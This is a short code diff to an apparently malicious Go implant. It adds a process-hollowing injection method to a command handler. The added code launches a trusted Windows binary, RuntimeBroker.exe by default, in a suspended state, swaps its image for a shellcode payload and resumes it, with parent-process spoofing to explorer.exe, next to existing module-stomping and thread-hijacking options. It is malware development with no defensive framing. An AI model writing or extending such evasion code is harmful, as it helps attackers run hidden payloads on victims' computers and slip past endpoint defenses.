@@ -77,6 +77,14 @@ func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payl
 		injectErr = evasion.StompInject(sc, pid)
 	case "threadhijack":
 		injectErr = evasion.ThreadHijackInject(sc, pid)
+	case "hollow":
+		// Process hollowing: launch hostExe suspended, replace its image with
+		// blob, resume.  PPID is spoofed to explorer.exe automatically.
+		hollowHost, _ := payload["host"].(string)
+		if hollowHost == "" {
+			hollowHost = `C:\Windows\System32\RuntimeBroker.exe`
+		}
+		injectErr = evasion.HollowInject(sc, hollowHost)
 	case "spawn":
 		// Spawn an exe with PPID spoofed to parent (default: explorer.exe).
 		// data field is not used for this method.
